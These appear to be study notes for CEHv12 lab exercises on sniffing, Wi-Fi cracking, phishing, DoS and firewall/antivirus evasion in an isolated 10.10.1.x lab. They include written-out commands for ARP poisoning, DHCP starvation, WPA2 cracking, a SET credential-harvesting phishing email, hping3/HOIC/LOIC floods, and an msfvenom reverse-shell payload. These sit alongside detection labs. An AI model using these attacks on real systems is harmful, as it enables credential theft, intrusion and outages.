# Module 8: Sniffing

## Lab 1: Perform Active Sniffing

### Task 1: Perform MAC flooding using macof

+ Open `Wireshark`
+ sniff on `ens33` interface
+ Open the `terminal`
+ sudo su
+ cd
+ macof -i ens33 -n 10
  + -i: specifies the interface
  + -n: specifies the number of packets to be sent
  + -d: specifies the destination IP address
+ Observe and IPv4 Packet on wireshark
  + Expand `Ethernet II` and view source and destination MAC addresses

### Task 2: Perform a DHCP starvation attack using Yersinia

+ Open `Wireshark`
+ sniff on `ens33` interface
+ Open the `terminal`
+ sudo su
+ cd
+ yersinia -I
+ Press `<any key>`, and then press `h` for help
+ Press `q` to exit the help options
+ Press `F2` to select DHCP mode
+ Press `x` to list available attack options
+ Press `1` on the `Attack Panel` to start a DHCP starvation attack
+ Press `q` to stop the attack and terminate Yersinia
+ Observe and DHCP Packets on wireshark
  + Expand `Ethernet II` and view source and destination MAC addresses

### Task 4: Perform an Man-in-the-Middle (MITM) attack using Cain & Abel

+ Open `Cain` on `Windows Server 2019` with `Administrator`
+ Click `Configure` in the menu bar
+ Add an Adapter using the `Configuration Dialog`
  + Add Adapter using the device IP Address under the `sniffer tab`
+ Click the Start/Stop Sniffer icon on the toolbar to begin sniffing
+ Click the `sniffer tab`
+ Click the `+ icon` and select `Scan MAC Addresses` to scan the network for hosts
  + select `All hosts in my subnet`
  + select `All Tests`
+ After Scanning, list of all active IP addresses along with their corresponding MAC addresses is displayed
+ Click the `APR tab` at the bottom of the window
+ Click anywhere on the topmost section in the right-hand pane to activate the plus (+) icon
+ Click the `plus (+) icon`, a `New ARP Poison Routing` window appears, from which we can add IPs to listen to traffic
+ Select the two IP addresses of the machine to monitor traffic between
+ Click to select the created target IP address scan displayed in the Configuration / Routes Packets tab
+ Click on the `Start/Stop APR icon` to start capturing ARP packets. The Status will change from `Idle` to `Poisoning`
+ Login on `Windows Server 2022` with `Administrator`
+ Open a `Command Prompt`
+ Login to FTP Server
  + ftp 10.10.1.11
  + User:     Jason
  + Password: qwerty
+ On the Cain Application, navigate to the `Passwords` tab from the bottom of the window
+ Click `FTP` from the left-hand pane to view the sniffed password for ftp 10.10.1.11

---

## Lab 2: Perform Network Sniffing using Various Sniffing Tools

### Task 1: Perform password sniffing using Wireshark

+ Open `wireshark` on `Windows Server 2019` with `Administrator`
+ sniff on `Ethernet 2` interface
+ Login to `Windows 11` and login to `Admin`
+ Open `Microsoft Edge` and traverse to `http://www.moviescope.com/`
+ Enter the Username and Password as `sam` and `test`, and click Login on the website
+ `Stop` the wireshark capture and `save` the file as `Password Sniffing`
+ Apply a display filter field, type `http.request.method == POST`
+ Click `Edit` than `Find Packet`
+ Click Display filter, select `String` from the drop-down options. Click `Packet list`, select `Packet details` from the drop-down options, and click `Narrow & Wide` and select `Narrow (UTF-8 / ASCII)`
+ In the field next to String, type `pwd` and click the Find button
+ Expand the HTML Form URL Encoded: application/x-www-form-urlencoded node from the packet details section, and view the captured username and password
+ Open `Remote Desktop Connection` on `Windows Server 2019`
+ Click to `show options`
  + Computer: 10.10.1.11
  + Username: Jason
  + Select: Allow me to save credentials
  + Password: qwerty
  + Uncheck: Remember me
+ Go to control Panel and navigate to `System and Security --> Windows Tools`
+ Click on `Services`
+ `Start` the service `Remote Packet Capture Protocol v.0 (experimental)`
+ Close Remote Desktop Connection on Windows 11
+ Launch `wireshark` in `Windows Server 2019`
+ Click `Manage Interfaces`
+ Add a `Remote Interface` using the `Remote interfaces tab`
  + Host: 10.10.1.11
  + Port: 2002
  + Authentication: Password Authentication
  + Username: Jason
  + Password: qwerty
+ Make use of the new remote interface added and start a capture
+ Login to `Windows 11` with `Jason`
+ Open `Microsoft Edge` and traverse to `http://www.goodshopping.com`
+ Stop Capturing traffic and analyse the traffic

---

## Lab 3: Detect Network Sniffing

### Task 1: Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network

#### Detecting ARP poisoning in a switch-based network

+ Open `Cain` on `Windows Server 2019` with `Administrator`
+ Click `Configure` in the menu bar
+ Add an Adapter using the `Configuration Dialog`
  + Add Adapter using the device IP Address under the `sniffer tab`
+ Click the Start/Stop Sniffer icon on the toolbar to begin sniffing
+ Click the `sniffer tab`
+ Click the `+ icon` and select `Scan MAC Addresses` to scan the network for hosts
  + select `All hosts in my subnet`
  + select `All Tests`
+ After Scanning, list of all active IP addresses along with their corresponding MAC addresses is displayed
+ Click the `APR tab` at the bottom of the window
+ Click anywhere on the topmost section in the right-hand pane to activate the plus (+) icon
+ Click the `plus (+) icon`, a `New ARP Poison Routing` window appears, from which we can add IPs to listen to traffic
+ Select the two IP addresses of the machine to monitor traffic between
+ Click to select the created target IP address scan displayed in the Configuration / Routes Packets tab
+ Click on the `Start/Stop APR icon` to start capturing ARP packets. The Status will change from `Idle` to `Poisoning`
+ Open the `terminal`
+ sudo su
+ cd
+ hping3 [Target IP Address] -c 100000
+ Launch `wireshark` on `Windows Server 2019`
+ Edit the `Protocols` under `Preferences`
  + select the `ARP/RARP` option
  + check the `Detect ARP request storms` checkbox
  + check the `Detect duplicate IP address configuration ` checkbox
+ Monitor the traffic from `Ethernet 2`
+ Stop the packet capture
+ Click `Analyse` than `Expert Information` on `wireshark`
+ Click to expand the `Warning node` labeled `Duplicate IP address configured (10.10.1.11)`, running on the `ARP/RARP` protocol
+ Click on the packet number displayed on `wireshark Expert Information`
+ The warnings highlighted in yellow indicate that duplicate IP addresses have been detected at one MAC address

#### Promiscuous mode detection using Nmap

+ Open `Zenmap` on `Windows 11` with `Administrator`
+ nmap --script=sniffer-detect [Target IP Address/ IP Address Range]
+ The scan results appear, displaying Likely in promiscuous mode under the Host script results section. This indicates that the target system is in promiscuous mode.

### Task 2: Detect ARP Poisoning using the Capsa Network Analyzer

+ Login to `Windows 11` and login to `Admin`
+ Open `Microsoft Edge` and traverse to `https://www.colasoft.com/download/arp_flood_arp_spoofing_arp_poisoning_attack_solution_with_capsa.php`
+ Download Capsa Enterprise Trial and register for an account
+ unzip `capsa_ent_15.1.0.15104_x64.zip` and set up the program
+ Activate the program using your license key using `Activate Online`
+ In the Analysis Project 1 - Colasoft Capsa Enterprise Trial window `check` the checkbox beside the available adapter (here, `Ethernet`) and click on `Start`.
+ Navigate to the `Diagnosis tab` in the Analysis Project 1 - Colasoft Capsa Enterprise Trial window
+ Open the `terminal`
+ sudo su
+ habu.arp.poison 10.10.1.11 10.10.1.13
+ In the `Diagnosis tab`, expand the `Data Link Layer node` to see the `ARP Too Many Unrequested Replies warning`
+ Right-click on any Security warning under Details section and select Resolve Address… from the context menu.
+ An Address Resolver pop-up appears, once the address resolving completes click on OK
+ Now to locate the Parrot Machine's IP address click on All Diagnosis option under Events section
+ Now select Parrot Security machine's IP address from the list (here, 10.10.1.13) and double-click on it
+ The IP - Behaviour Analysis10.10.1.13 - Analysis Project1 window appears. Now click on `Packet tab` in the Analysis Project 1 - Colasoft Capsa Enterprise Trial window, to check the `packets transferred by the Parrot Security machine`
+ After completing the analysis, close the IP - Behaviour Analysis10.10.1.13 - Analysis Project1 window and return back to Analysis Project 1 - Colasoft Capsa Enterprise Trial window. Now click on `Analaysis Settings(N)` from the menu bar and select `Diagnosis` from the drop down options
+ In the Analysis Settings window `check` the checkbox beside `Diagnosis node` under `Analysis Settings` option in the left hand pane to select the `Diagnosis settings`
+ Now `check` the checkbox beside `Log option` In the Analysis Settings window, `check` the `Save log to disk` checkbox and `click` the `ellipsis button under File path option`
+ In the Select Folder window, select `Desktop` and click on `Select Folder`
+ Ensure that `csv` file radio button is selected under Save As section and select `1 minute` under Split file every: section (this option directly saves a new log file in the specified location for every 1 minute), leave all the other settings as default and click OK
+ We can see that the csv log file is created in `Desktop -> log_diagnosis` location

---

# Module 16: Hacking Wireless Networks

## Lab 1:  Perform Wireless Traffic Analysis

### Task 1: Wi-Fi Packet Analysis using Wireshark

+ Open `wireshark` on `Windows 11` with `Admin`
+ Open the pcap file `WEPcrack-01.cap` in `E:\CEH-Tools\CEHv12 Module 16 Hacking Wireless Networks\Sample Captures`

---

## Lab 2: Perform Wireless Attacks

### Task 1: Crack a WEP Network using Aircrack-ng

+ Login to `Parrot` and open the `file explorer`
+ Navigate to the `CEHv12 Module 16 Hacking Wireless Networks` folder and copy `Sample Captures` and `Wordlist folders`
+ Paste the files `Sample Captures` and `Wordlist folders` in the `Desktop`
+ Open the `terminal`
+ sudo su
+ aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap'

### Task 2: Crack a WPA2 Network using Aircrack-ng

+ Login to `Parrot` and open the `file explorer`
+ Navigate to the `CEHv12 Module 16 Hacking Wireless Networks` folder and copy `Sample Captures` and `Wordlist folders`
+ Paste the files `Sample Captures` and `Wordlist folders` in the `Desktop`
+ Open the `terminal`
+ sudo su
+ aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
  + -a is the technique used to crack the handshake, 2=WPA technique
  + -b refers to bssid; replace with the BSSID of the target router
  + -w stands for wordlist; provide the path to a wordlist

---

# Module 9: Social Engineering

## Lab 1: Perform Social Engineering using Various Techniques

### Task 1: Sniff Credentials using the Social-Engineer Toolkit (SET)

+ Open the `terminal`
+ sudo su
+ cd social-engineer-toolkit
+ ./setoolkit
+ The `SET` menu appears, as shown in the screenshot. Type `1` and press Enter to choose `Social-Engineering Attacks`
+ A list of options for `Social-Engineering Attacks` appears; type `2` and press Enter to choose `Website Attack Vectors`
+ A list of options in `Website Attack Vectors` appears; type `3` and press Enter to choose `Credential Harvester Attack Method`
+ Type `2` and press Enter to choose `Site Cloner` from the menu
+ Type the IP address of the local machine (`10.10.1.13`) in the prompt for “`IP address for the POST back in Harvester/Tabnabbing`” and press Enter
+ Now, you will be prompted for the URL to be cloned; type the desired URL in “`Enter the url to clone`” and press Enter. In this task, we will clone the URL `http://www.moviescope.com`
+ If a message appears that reads `Press {return} if you understand what we’re saying here`, press `Enter`
+ Login to gmail using firefox and craft an email
  
      Reciepient: 
      Subject: Unlocking - Premium Membership
      Message: 
      Dear Member, 

      Your account on moviescope has recently been promoted to a premium account. 
      With the premium membership, you can enjoy the benefits of booking tickets at the discounted rate.

      To avail the benefits of the membership, do the following:
      1. Visit the below link and login using your credentials
      2. Navigate to the account tab and select the avail benefits button.
      [http://www.moviescope.com/avail_benefits](http://10.10.1.13)
      Regards,
      MovieScope Team

+ Send the email to the intended reciepient
+ Login to `Windows 11` and login to `Admin`
+ Open `Microsoft Edge` and login to `gmail`
+ Click and open the malicious link
+ The victim will be prompted to enter his/her username and password into the form fields, which appear as they do on the genuine website. When the victim enters the `Username` and `Password` and clicks `Login`, he/she will be redirected to the legitimate MovieScope login page. Note the different URLs in the browser address bar for the cloned and real sites
+ Go back to `Parrot` and access the `terminal`
+ Locate the `Username` and `Password` displayed in plain text


## Lab 2: Detect a Phishing Attack

### Task 1: Detect phishing using Netcraft

+ Login to `Windows 11` and login to `Admin`
+ Open `Microsoft Edge` and traverse to `https://www.netcraft.com/apps/`
+ Scroll-down and click `Find out more` button under `BROWSER` option on the webpage
+ Click `ellipses icon` from the top-right corner of the webpage and click `Download` button
+ You will be directed to the `Get it now` section; click the `Microsoft Edge` browser icon
+ On the next page, click the `Add to Microsoft Edge` button to install the Netcraft extension
+ After the installation finishes, you may be asked to restart the browser. If so, click `Restart Now`
+ The Netcraft Extension icon now appears on the top-right corner of the browser
+ Now, In the address bar of the browser place your mouse cursor, type `http://www.certifiedhacker.com/` and press `Enter`
+ The `certifiedhacker.com` webpage appears. Click the `Netcraft Extension icon` in the top-right corner of the browser. A dialog box appears, displaying a summary of information such as `Risk Rating, Site rank, First seen`, and `Host` about the searched website
+ Now, click the `Site Report` link from the dialog-box to view a report of the site
+ The `Site report for certifiedhacker.com` page appears, displaying detailed information about the site such as `Background, Network, IP Geolocation, SSL/TLS` and `Hosting History`
+ If you attempt to visit a website that has been identified as a phishing site by the `Netcraft Extension`, you will see a pop-up alerting you to `Suspected Phishing`
+ Now, in the browser window open a new tab, type `https://smbc.ctad-co.com/m` and press `Enter`
+ The Netcraft Extension automatically blocks phishing sites. However, if you trust the site, click `Visit anyway` to browse it; otherwise, click `Report mistake` to report an incorrectly blocked URL

### Task 2: Detect phishing using PhishTank

+ Login to `Windows 11` and login to `Admin`
+ Open `Microsoft Edge` and traverse to `https://www.phishtank.com`
+ The `PhishTank` webpage appears, displaying a list of phishing websites under `Recent Submissions`
+ Click on any phishing website `ID` in the `Recent Submissions` list (in this case, `7486626`) to view detailed information about it
+ If the site is a phishing site, `PhishTank` returns a result stating that the website “`Is a phish`” as shown in the screenshot.
+ In the `Found a phishing site?` text field, type a website URL to be checked for phishing (in this example, the URL entered is `be-ride.ru/confirm`). Click the `Is it a phish?` button
+ f the site is a phishing site, `PhishTank` returns a result stating that the website “`Is a phish`”

---

# Module 10: Denial-of-Service

## Lab 1: Perform DoS and DDoS Attacks using Various Techniques

### Task 1: Perform a DoS attack (SYN flooding) on a target host using Metasploit

+ Open the `terminal`
+ sudo su
+ cd
+ nmap -p 21 (Target IP address)
  + 10.10.1.11
+ perform SYN flooding on the target machine (Windows 11) using port 21
+ msfconsole
+ use auxiliary/dos/tcp/synflood
+ set RHOST 10.10.1.11
+ set RPORT 21
+ set SHOST 10.10.1.19
+ exploit
+ Open `wireshark` on `Windows 11` with `Admin`
+ Start a capture on the `Ethernet` interface
+ `Wireshark` displays the traffic coming from the machine. Here, you can observe that the `Source IP` address is that of the `Windows Server 2019` (10.10.1.19) machine. This implies that the IP address of the `Parrot Security` machine has been spoofed.

### Task 2: Perform a DoS attack on a target host using hping3

#### DoS attack

+ Open `wireshark` on `Windows 11` with `Admin`
+ Start a capture on the `Ethernet` interface
+ Open the `terminal`
+ sudo su
+ cd
+ hping3 -S 10.10.1.11 -a 10.10.1.19 -p 22 --flood
  + -S: sets the SYN flag
  + -a: spoofs the IP address
  + -p: specifies the destination port
  + --flood: sends a huge number of packets
+ Stop the SYN flooding of the target machine
+ View the `I/O Graph` in the `statistics` tab

#### Ping of Death attack

+ Open the `terminal`
+ sudo su
+ cd
+ hping3 -d 65538 -S -p 21 --flood 10.10.1.11
+ Open `wireshark` on `Windows 11` with `Admin`
+ Start a capture on the `Ethernet` interface
+ Stop the capture and the attack

#### UDP application layer flood attack

+ Open the `terminal`
+ sudo su
+ cd
+ nmap -p 139 10.10.1.19
+ hping3 -2 -p 139 --flood 10.10.1.19
  + -2: specifies the UDP mode
  + -p: specifies the destination port
  + --flood: sends a huge number of packets
+ Open `wireshark` on `Windows Server 2019` with `Administrator`
+ Start a capture on the `Ethernet 2` interface
+ Stop the capture and the attack
+ Attacks can be carried out the ping flood
  + CharGEN (Port 19)
  + SNMPv2 (Port 161)
  + QOTD (Port 17)
  + RPC (Port 135)
  + SSDP (Port 1900)
  + CLDAP (Port 389)
  + TFTP (Port 69)
  + NetBIOS (Port 137,138,139)
  + NTP (Port 123)
  + Quake Network Protocol (Port 26000)
  + VoIP (Port 5060)

### Task 3: Perform a DoS Attack using Raven-storm

+ Open the `terminal`
+ sudo su
+ sudo rst
+ Type `l4` and press `Enter` to load `layer4` module (UDP/TCP)
+ Open `wireshark` on `Windows Server 2019` with `Administrator`
+ Start a capture on the `Ethernet 2` interface
+ In the terminal window, type `ip 10.10.1.19` and press `Enter` to specify the target IP address
+ Type `port 80` and press `Enter`, to specify the target port
+ Type `threads 20000` and press `Enter`, to specify number of threads
+ Now, in the terminal type `run` and press `Enter`, to start the DoS attack on the target machine
+ Observe a large number of packets received from `Parrot Security` machine (10.10.1.13) on the `Windows Server 2019`
+ Stop the capture and the attack

### Task 4: Perform a DDoS attack using HOIC

+ Open `wireshark` on `Parrot`
+ Start a capture on the `Ethernet 0` interface
+ Navigate to `E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools` and copy the `High Orbit Ion Cannon (HOIC)` folder to `Desktop`
+ Copy the `E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools` and copy the `High Orbit Ion Cannon (HOIC)` folder to `Windows Server 2019` and `Windows Server 2022`
+ Launch `hoic2.1.exe` on all the devices
+ The `HOIC` GUI main window appears; click the “+” button below the `TARGETS` section
+ The `HOIC - [Target]` pop-up appears. Type the target URL such as `http://[Target IP Address]` (here, the target IP address is `10.10.1.13 [Parrot Security]`) in the URL field. Slide the `Power` bar to `High`. Under the `Booster` section, select `GenericBoost.hoic` from the drop-down list, and click `Add`
+ Set the `THREADS` value to `20` by clicking the > button until the value is reached
+ Start the attack from all the devices towards the `Parrot Security`
+ Notice the packets captured by wireshark
+ Stop the attack from all the servers

### Task 5: Perform a DDoS attack using LOIC

+ Open `wireshark` on `Parrot`
+ Start a capture on the `Ethernet 0` interface
+ Navigate to ` E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC)` folder to `Desktop`
+ Copy the `E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools` and copy the `Low Orbit Ion Cannon (LOIC)` folder to `Windows Server 2019` and `Windows Server 2022`
+ Launch `LOIC.exe` on all the devices
+ Configure the Settings on all the devices
  + Under the Select your target section, type the target IP address under the IP field (here, 10.10.1.13), and then click the Lock on button to add the target devices
  + Under the `Attack options` section, select `UDP` from the drop-down list in `Method`. Set the thread's value to `10` under the `Threads` field. Slide the power bar to the middle
+ Start the attack from all the devices towards the `Parrot Security`
+ Notice the packets captured by wireshark
+ Stop the attack from all the servers

## Lab 2: Detect and Protect Against DoS and DDoS Attacks

### Task 1: Detect and protect against DDoS attacks using Anti DDoS Guardian

+ On the `Windows 11` machine, navigate to `E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Protection Tools\Anti DDoS Guardian` and double click `Anti_DDoS_Guardian_setup.exe`
+ In the `Stop Windows Remote Desktop Brute Force` wizard, `uncheck` the `install Stop RDP Brute Force` option, and click `Next`
+ The `Select Additional Tasks` wizard appears; check the `Create a desktop shortcut` option, and click `Next`
+ The `Ready to Install` wizard appears; click `Install`
+ The `Completing the Anti DDoS Guardian Setup Wizard` window appears; uncheck the `Launch Mini IP Blocker` option and click `Finish`
+ Open `LOIC.exe` on `Windows Server 2019` and `Windows Server 2022` with `Administrator`
+ Configure the Settings
  + Under the `Select your target` section, type the target IP address under the `IP` field (here, `10.10.1.11`), and then click the `Lock on` button to add the target devices
  + Under the `Attack options` section, select `UDP` from the drop-down list in `Method`. Set the thread's value to `5` under the `Threads` field. Slide the power bar to the middle
+ Observe the packets recieved by the machine
+ Double click the IP address and perfrom the desired action
+ Stop the attack from all the servers

---

# Module 12: Evading IDS Firewalls and Honeypots

## Lab 1: Perform Intrusion Detection using Various Tools

### Task 1: Detect intrusions using Snort

+ Login to `Windows Server 2019` with `Administrator`
+ Navigate to `Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort` and double-click the `Snort_2_9_15_Installer.exe` file to start the Snort installation
+ Navigate to the `etc` folder in the specified location, `Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc` of the Snort rules; copy `snort.conf` and paste it in `C:\Snort\etc`
+ `snort.conf` is already present in `C:\Snort\etc`; replace the file with the newly copied file
+ Copy the `so_rules` folder from `Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150` and paste into `C:\Snort`
+ Copy the `preproc_rules` folder from` Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150`, and paste it into `C:\Snort`. The preproc_rules folder is already present in C:\Snort; replace this folder with the preproc_rules folder taken from the specified location.
+ Using the same method, copy the `rules` folder from `Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150` and paste into `C:\Snort`
+ Open `Command Prompt` as `Administrator`
+ cd C:\Snort\bin
+ Type `snort` and press Enter
+ Snort initializes; wait for it to complete. After completion press `Ctrl+C`, Snort exits and comes back to `C:\Snort\bin`.
+ Now type `snort -W`. This command lists your machine’s physical address, IP address, and Ethernet Drivers, but all are disabled by default
+ Observe your Ethernet Driver `index number` and write it down (in this task, it is `1`)
+ To `enable` the Ethernet Driver, in the command prompt, type `snort -dev -i 1` and press `Enter`
+ Launch another `Command Prompt` and type `ping google.com` and press `Enter`
+ Close both `Command Prompts`
+ Configure the `snort.conf` file, located at `C:\Snort\etc`
+ Open the `snort.conf` file with `Notepad++`
+ Scroll down to the `Step #1: Set the network variables section (Line 41)` of the snort.conf file. In the `HOME_NET line (Line 45)`, replace `any` with the IP addresses of the machine (target machine) on which Snort is running. Here, the target machine is Windows Server 2019 and the IP address is `10.10.1.19`
+ Leave the `EXTERNAL_NET any` line as it is
+ If you have a DNS Server, then make changes in the `DNS_SERVERS` line by replacing `$HOME_NET` with your `DNS Server IP address`; otherwise, leave this line as it is
  + 8.8.8.8
  + 153.20.80.13
+ Scroll down to `RULE_PATH (Line 104)`. In Line 104, replace `../rules` with `C:\Snort\rules` in `Line 105`, replace `../so_rules` with `C:\Snort\so_rules` and in `Line 106`, replace `../preproc_rules` with `C:\Snort\preproc_rules`
+ In `Lines 109` and `110`, replace `../rules` with `C:\Snort\rules`. Minimize the `Notepad++` window
+ Navigate to `C:\Snort\rules`, and create two text files; name them `white_list` and `black_list` and change their file extensions from `.txt` to `.rules`
+ Switch back to `Notepad++`, scroll down to the `Step #4: Configure dynamic loaded libraries section (Line 238)`. Configure dynamic loaded libraries in this section
+ Add the path to `dynamic preprocessor libraries (Line 243)`; replace `/usr/local/lib/snort_dynamicpreprocessor/` with your dynamic preprocessor libraries folder location, `C:\Snort\lib\snort_dynamicpreprocessor`
+ At the path to base `preprocessor (or dynamic) engine (Line 246)`, replace `/usr/local/lib/snort_dynamicengine/libsf_engine.so` with your base preprocessor engine `C:\Snort\lib\snort_dynamicengine\sf_engine.dll`
+ Add `(space)` in between `#` and `dynamicdetection (Line 250)`
+ Scroll down to the `Step #5: Configure preprocessors section (Line 253)`, the listed preprocessor. This does nothing in IDS mode, however, it generates errors at runtime.
+ Comment out all the preprocessors listed in this section by adding ‘`#`’ and (space) before each `preprocessor rule (262-266)`
+ Scroll down to `line 326` and delete `lzma` keyword and a `(space)`
+ Scroll down to Step `#6: Configure output plugins (Line 513)`. In this step, provide the location of the `classification.config` and `reference.config` files
  + `C:\Snort\etc\classification.config`
  + `C:\Snort\etc\reference.config`
+ In Step #6, add to `line (534)` `output alert_fast: alerts.ids:` this command orders Snort to dump all logs into the alerts.ids file
+ In the `snort.conf` file, find and replace the `ipvar` string with `var`. To do this, press `Ctrl+H` on the keyboard. The Replace window appears; enter `ipvar` in the Find what : text field, enter `var` in the Replace with : text field, and click `Replace All`
+ Save the snort.conf file
+ Navigate to `C:\Snort\rules` and open the `icmp-info.rules` file with `Notepad++`
+ In line 21, type `alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.19 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)` and `save`. Close the Notepad++ window
+ Open `Command Prompt` as `Administrator`
+ cd C:\Snort\bin
+ Type `snort` and press Enter
+ snort -i1 -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
+ If you have entered all command information correctly, you receive a comment stating `Commencing packet processing (pid=xxxx)` (the value of xxxx may be any number; in this task, it is 5384)
+ Login to `Windows 11` and login to `Admin`
+ Open the `command prompt` and issue the command `ping 10.10.1.19 -t` from the `Attacker Machine`
+ Observe that Snort triggers an alarm
+ Stop Snort
+ Go to the `C:\Snort\log\10.10.1.11` folder and open the `ICMP_ECHO.ids` file with Notepad++. You see that all the log entries are saved in the ICMP_ECHO.ids file

### Task 3: Detect malicious network traffic using HoneyBOT

+ Login to `Windows Server 2022` with `Administrator`
+ Navigate to `Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Honeypot Tools\HoneyBOT`. Double-click `HoneyBOT_018.exe` to launch the HoneyBOT installer. Follow the wizard-driven steps to install HoneyBOT
+ Click the `Start` icon from the left-bottom of Desktop. Under Recently added applications, right-click `HoneyBOT --> More --> Run as administrator`
+ Leave the settings on default for the `General` tab in the `Options` window
+ On the `Exports` tab, in which you can export the logs recorded by HoneyBOT, choose the required option to view the reports, and then proceed to the next step. (here, `Export Logs` to `CSV` and `Upload Logs to Server` checkbox are `selected`)
+ On the `Updates` tab, `uncheck` Check for Updates; click `Apply` and click `OK` to continue
+ Open the `terminal`
+ sudo su
+ cd
+ telnet 10.10.1.22
+ Switch back to the `Windows Server 2022` machine. In the `HoneyBOT` window, expand the `Ports and Remotes node` from the left-pane
+ Right-click any `IP address` or `Port` on the left, and click `View Details`
+ Packet Log shows `Connection Details`
+ 

## Lab 2: Evade Firewalls using Various Evasion Techniques

### Task 1: Bypass windows firewall using Nmap evasion techniques

+ Login to `Windows 11` with `Admin`
+ Switch on Windows Defender
+ In the `Windows Defender Firewall with Advanced Security window` appears; here, we are going to `create an inbound rule`. Select Inbound Rules in the left pane and click `New Rule` under Actions
+ The New Inbound Rule Wizard appears. In the Rule Type section, choose the `Custom` radio button to create a custom inbound rule and click `Next`
+ In the `Program` section, leave the settings to `default` and click `Next`
+ In the `Protocol and Ports` section, leave the settings to `default` and click `Next`
+ In the `Scope` section, choose the `These IP addresses` radio button under `Which remote IP addresses does this rule apply to?`, and then click `Add`
+ The IP Address pop-up appears; type the IP address of the Parrot Security machine and click `OK` (here, the IP address of Parrot Security machine is `10.10.1.13`)
+ Click `Next` in the Scope section once the IP address has been added
+ In the `Action` section, choose the `Block the connection` radio button and click `Next`
+ In the `Profile` section, leave the settings on `default` and click `Next`
+ In the `Name` section, provide any name to the rule (here, `Block Parrot Security`) and click `Finish`
+ nmap 10.10.1.11
+ nmap -sS 10.10.1.11
  + TCP SYN Port Scan
+ nmap -T4 -A 10.10.1.11
  + INTENSE Scan
+ nmap -sP 10.10.1.0/24
  + Ping Sweep
+ nmap -sI 10.10.1.22 10.10.1.11
  + Zombie Scan
+ Delete the Firewall Rule and Switch off the firewalls

### Task 2: Bypass firewall rules using HTTP/FTP tunneling

+ Login to `Windows Server 2022` with `Administrator`
+ Click `Start` and click the `Windows Administrative Tools` app. The Windows Administrative Tools window appears; double-click `Services` to launch
+ Disable `IIS Admin Service` and `World Wide Web Publishing services`
+ Navigate to `Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTHost` and double-click `htthost.exe`
+ A `HTTHost` wizard appears; click the `Options` tab
+ On the Options tab, leave `90` as the `port number` in the Port field under the Network section. Keep the other settings on `default`, except for Personal password, which should contain any other password. In this task, the `Personal password` is `“magic`.”
+ Ensure that `Revalidate DNS names` and `Log connections` are `checked` and click `Apply`
+ Navigate to the `Application log` tab and check if the last line is Listener: `listening at 0.0.0.0:90`, which ensures that HTTHost is running properly and has begun to listen on port `90`
+ On the `Windows Server 2019` machine and `Turn on` Windows Defender Firewall
+ Create a `new outbound law` and `block specific` connections for `Remote TCP port 21`
+ In `Name`, type `Port 21 Blocked` in the Name field and click `Finish`
+ `Disable` the rule and test the connectivity with `command prompt` you should be able to connect
  + ftp 10.10.1.11
+ `Enable` the rule and test the connectivity with `command prompt` you should not be able to connect
  + ftp 10.10.1.11

#### Tunnelling

+ Navigate to `Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTPort` and double-click `httport3snfm.exe`
+ Launch `HTTPort` (Httport3SNFM) from the `Start` menu
+ On the `Proxy` tab, enter the Host name or IP address (`10.10.1.22`) of the machine where HTTHost is running (Windows Server 2022)
+ Enter the Port number `90`
+ In the `Misc.` options section, select Remote host from the `Bypass` mode drop-down list
+ In the `Use personal remote host at (blank = use public)` section, re-enter the IP address of Windows Server 2022 (`10.10.1.22`) and port number `90`
+ Enter the password `magic` into the Password field
+ Select the `Port mapping` tab, and click `Add` to create a new mapping
+ Right-click the `New mapping` node, and click `Edit`
+ Rename this as `ftp test` (you can enter the name of your choice)
+ Right-click the `node below Local port`; then click Edit and enter the port value as `21`
+ Right-click the `node below Remote host`; click Edit and rename it as `10.10.1.11`
+ Right-click the `node below Remote port`; then click Edit and enter the port value as `21`
+ Switch to the `Proxy` tab and click `Start` to begin the HTTP tunneling
+ In the `Windows Server 2019` click the `Windows Administrative Tools` app. The Windows Administrative Tools window appears; double-click `Services` to launch
+ Disable `IIS Admin Service`, `World Wide Web Publishing services` and `FTP`
+ In `Windows Server 2019`; launch Command Prompt, type `ftp 10.10.1.11`, and press `Enter`. The ftp connection will be blocked by the outbound firewall rule
+ Launch a new Command Prompt, type `ftp 127.0.0.1`, and press `Enter`
+ mkdir Test
+ A directory named `Test` will be created in the FTP folder on the Windows 11 (location: `C:\FTP`) machine

### Task 3: Bypass Antivirus using Metasploit Templates

+ Open the `terminal`
+ sudo su
+ msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Windows.exe
+ Launch `Microsoft Edge` and navigate to `https://www.virustotal.com`
+ Upload the Windows.exe file and notice the number of antivirus that have detected the virus
+ In the terminal, type `pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c` and press `Enter`
+ A `template.c` file appears, in the `line 3` change the payload size from `4096` to `4000`, `save` the file and `close` the editor
+ cd /usr/share/metasploit-framework/data/templates/src/pe/exe/
+ i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
+ ls
